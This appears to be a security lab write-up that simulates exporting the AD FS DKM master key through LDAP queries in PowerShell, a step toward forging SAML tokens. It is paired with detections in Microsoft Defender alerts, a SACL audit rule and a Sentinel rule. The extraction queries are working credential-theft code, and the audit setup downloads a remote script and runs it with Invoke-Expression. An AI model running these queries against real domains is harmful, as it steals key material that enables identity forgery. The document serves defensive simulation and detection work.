# Export AD FS DKM Master Key via LDAP Queries

The path of the AD FS DKM container in the domain controller might vary, but it can be obtained from the `AD FS configuration settings`. After getting the AD path to the container, a threat actor can directly access the AD contact object and read the AD FS DKM master key value. One way to access and retrieve the DKM master key can be via LDAP queries.

## Table of Contents

* [Preconditions](#preconditions)
* [Simulation Steps](#simulation-steps)
* [Detection](#detection)
* [Output](#output)
* [References](#references)

## Preconditions

* Integrity level: medium
* Authorization:
    * Resource: AD FS Database 
        * Identity:
            * AD FS Service Account
            * Local Administrator
    * Resource: AD FS DKM Container
        * Identity:
            * AD FS Service Account
            * AD Domain Administrator
* Domain Controller:
    * Services:
        * Lightweight Directory Access Protocol (LDAP)
    * Network:
        * Port: 389
* Input:
    * AD FS Configuration Settings

## Simulation Steps

### Get Path of AD FS DKM container

The AD FS DKM key value is stored in the `ThumbnailPhoto` attribute of an AD contact object in the AD FS DKM container. Therefore, we first need to get the path of the AD FS DKM container in the AD domain controller. That information can be retrieved from the `AD FS configuration settings`.

```PowerShell
[xml]$xml=$settings
$group = $xml.ServiceSettingsData.PolicyStore.DkmSettings.Group
$container = $xml.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
$parent = $xml.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn
$base = "LDAP://CN=$group,$container,$parent"
$base
```

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_13_get_ad_dkm_path.png)

### Query LDAP

We can use LDAP and create a query filtering on specific objects with the `ThumbnailPhoto` attribute. We can then read the encryption key from the `ThumbnailPhoto` attribute.

```PowerShell
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
$ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null
$ADSearch.Filter='(&(objectclass=contact)(!name=CryptoPolicy)(ThumbnailPhoto=*))'
$ADUser=$ADSearch.FindOne()
$key=[byte[]]$aduser.Properties["thumbnailphoto"][0]
[System.BitConverter]::ToString($key)
```

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_14_ldap_thumbnailphoto_filter.png)

One could also filter on the `CryptoPolicy` contact object inside of the AD FS DKM container and get the value of its `DisplayName` attribute. This attribute refers to the `l` attribute of the right AD contact object that contains the DKM master key value. The DKM key is stored in its `ThumbnailPhoto` attribute.

```PowerShell
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
$ADSearch.Filter = '(name=CryptoPolicy)'
$aduser = $ADSearch.FindOne()
$keyObjectGuid = $ADUser.Properties["displayName"]
$ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null
$ADSearch.Filter="(l=$keyObjectGuid)"
$aduser=$ADSearch.FindOne() 
$key=[byte[]]$aduser.Properties["thumbnailphoto"][0]
[System.BitConverter]::ToString($key)
```

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_15_ldap_filter_cryptopolicy.png)

## Detection

### Detect LDAP Query with `ThumbnailPhoto` Property in Filter

#### Microsoft Defender for Identity Alerts

**Active Directory attributes Reconnaissance using LDAP**

When a threat actor sets the property `ThumbnailPhoto` as a filter in the LDAP search query, the MDI sensor in the domain controller triggers an alert of type `Active Directory attributes Reconnaissance using LDAP`.
1.	Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/).
2.	Go to `More Resources` and click on [Azure Advanced Threat Protection](https://simuland.atp.azure.com/).


![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_16_m365_mdi_alert_local_ldap.png)

#### Microsoft Cloud App Security Alerts

**Active Directory attributes Reconnaissance using LDAP**

You can also see the same alert in the Microsoft Cloud Application Security (MCAS) portal. The MCAS portal is considered the new investigation experience for MDI.
1.	Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/)
2.	Go to “More Resources” and click on “[Microsoft Cloud App Security](https://portal.cloudappsecurity.com/)”.

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_17_m365_mcas_alert_local_ldap.png)

#### Microsoft Defender for Endpoint Alerts

**ADFS private key extraction attempt**

Microsoft Defender for Endpoint sensors also trigger an alert named `ADFS private key extraction attempt` when a threat actor sets the property `ThumbnailPhoto` as a filter in the LDAP search query.
1.	Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/).
2.	Go to `More Resources` and click on [Microsoft Defender Security Center](https://login.microsoftonline.com/).
3.	Go to `Incidents`.

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_18_m365_mde_alert_local_ldap.png)

### Detect LDAP Query with Indirect Access to `ThumbnailPhoto` Property

### Microsoft Defender for Endpoint Alerts

**ADFS private key extraction attempt**

Microsoft Defender for Endpoint sensors also trigger an alert named `ADFS private key extraction attempt` when a threat actor accesses the contact AD object holding the DKM key, but without specifying the `ThumbnailPhoto` attribute as part of the filter in the LDAP search query.

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_19_m365_mde_alert_local_ldap_no_cryptopolicy.png)

### Detect Access to AD Object

#### Azure Sentinel Detection Rules

**AD FS DKM Master Key Export**

We can also audit the access request to the AD FS DKM contact object in the domain controller. This audit rule can be enabled by adding an Access Control Entry (ACE) to the System Access Control List (SACL) of the AD FS DKM contact object in the domain controller. [A SACL is a type of access control list to log attempts to access a secured object](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists).

**Create Audit Rule**

1.	Connect to the Domain Controller (DC01) via the [Azure Bastion service](../../../../environments/_helper-docs/connectAzVmAzBastion.md) as an Administrator.
2.	Open PowerShell console as an Administrator.
4.	Get the path of the AD FS DKM container and use it to obtain the `GUID` of the AD FS DKM contact object holding the AD FS DKM master key (Encryption key).

```PowerShell
$AdfsDKMPath = "LDAP://CN=596f0e13-7a4b-49a1-a106-0cbcba66b065,CN=ADFS,CN=Microsoft,CN=Program Data,DC=simulandlabs,DC=com"
$ADSISearcher = [ADSISearcher]'(&(objectclass=contact)(!name=CryptoPolicy)(ThumbnailPhoto=*))'
$ADSISearcher.SearchRoot = [ADSI]"$AdfsDKMPath"
$results = $ADSISearcher.FindOne()
$results.Path
```

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_20_get_adfs_dkm_contact_ad_path.png)

5.	Import Active Directory Module:

```PowerShell
Import-Module ActiveDirectory
```

6.	Import the project [Set-AuditRule](https://github.com/OTRF/Set-AuditRule) in GitHub as a PowerShell module to automate the process.

```PowerShell
$uri = 'https://raw.githubusercontent.com/OTRF/Set-AuditRule/master/Set-AuditRule.ps1' 
$RemoteFunction = Invoke-WebRequest $uri –UseBasicParsing 
Invoke-Expression $($RemoteFunction.Content)
```

7.	Create an `Audit` rule to audit any `Generic Read` requests to that AD object.

```PowerShell
$ADObjectPath = 'CN=8e8a005d-e8eb-4d71-8bfc-de5abf98d5b4,CN=596f0e13-7a4b-49a1-a106-0cbcba66b065,CN=ADFS,CN=Microsoft,CN=Program Data,DC=simulandlabs,DC=com'

Set-AuditRule -AdObjectPath "AD:\$ADObjectPath" -WellKnownSidType WorldSid -Rights GenericRead -InheritanceFlags None -AuditFlags Success -verbose
```

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_21_create_sacl.png)

Once the audit rule is enabled, run any of the previous LDAP search queries from the previous section to trigger the audit rule. You can run the queries from the `ADFS01` server. You will see `Windows Security Event ID 4662` in the Domain Controller:

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_22_dc_event_4662.png)

Something to remember is that the XML representation of the security event provides the GUID of the AD FS DKM contact object and not the explicit path to the AD object. In our lab environment this `Object Name value` was `9736f74f-fd37-4b02-80e8-8120a72ad6c2`.

![](../../../../images/labs/goldemsaml/exportADFSTokenSigningCertificate/2021-05-19_23_dc_event_4662.png)

Use the following detection rule to explore this activity:

* [ADFS DKM Master Key Export](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/ADFS-DKM-MasterKey-Export.yaml)

## Output

* AD FS DKM Master Key

## References

* [Exporting ADFS certificates revisited: Tactics, Techniques and Procedures (o365blog.com)](https://o365blog.com/post/adfs/)